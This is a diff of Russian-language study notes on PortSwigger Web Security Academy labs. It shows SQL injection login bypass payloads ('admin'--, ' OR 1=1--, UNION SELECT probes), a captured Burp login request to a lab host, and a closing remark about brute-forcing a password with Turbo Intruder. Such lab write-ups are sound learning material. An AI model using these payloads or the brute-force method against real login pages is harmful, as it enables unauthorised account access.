@@ -37,8 +37,12 @@ SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 
 🟣 использую второй способ -Burp Suitе
 🟣вот так выглядит запрос на авторизацию 
-можно видеть парметры username  и password, здесь можно также сделать sql иньекцию добавив после ввода логина '-- логика таже самая csrf=MlOs9Czkz8FENTRbtDS5pWc7WYOytbPJ&username=qwefcqwef&password=123e
+можно видеть парметры username  и password, здесь можно также сделать sql иньекцию добавив после ввода логина '-- логика таже самая 
+
+`csrf=MlOs9Czkz8FENTRbtDS5pWc7WYOytbPJ&username=qwefcqwef&password=123e`
+
 =----------------------------------
+```http
 POST /login HTTP/2
 Host: 0af400db03e1633780ce2b760005003b.web-security-academy.net
 Cookie: session=lGAMgGxm2giuRePN8uOz9ZimhWjgcUaU
@@ -62,6 +66,7 @@ Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 
 csrf=MlOs9Czkz8FENTRbtDS5pWc7WYOytbPJ&username=admin&password=123e
+```
 =----------------------------------
 
 #### ⚙️ Принцип работы и анализ
@@ -98,17 +103,20 @@ csrf=MlOs9Czkz8FENTRbtDS5pWc7WYOytbPJ&username=admin&password=123e
 🔴🟩   **Тестирование:** 
 - **Базовые тесты:**
    
+```sql
     ' OR '1'='1
     ' OR 1=1--
     admin'--
     " OR ""="
+```
     
 - **Определение СУБД:**
     
-    - `' AND '1'='1` → если работает, возможно MySQL
+```sql
+    ' AND '1'='1` → если работает, возможно MySQL
         
-    - `' UNION SELECT NULL--` → проверка на Union-based
-        
+    ' UNION SELECT NULL--` → проверка на Union-based
+```        
 - **Инструменты:**
     
     - **Ручное:** Burp Suite, Browser DevTools
@@ -136,3 +144,6 @@ csrf=MlOs9Czkz8FENTRbtDS5pWc7WYOytbPJ&username=admin&password=123e
 
 <img src="../../assets/Снимок--16.07.49.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
 
+в турбо интрудере есть базовые скрипты для перебора, подставил пейлоад-список паролей, и подобрал пароль к нику, по ответу понял, где угадал!
+
+никакой защиты не было, ни от бутфорса, ни от спец символов!
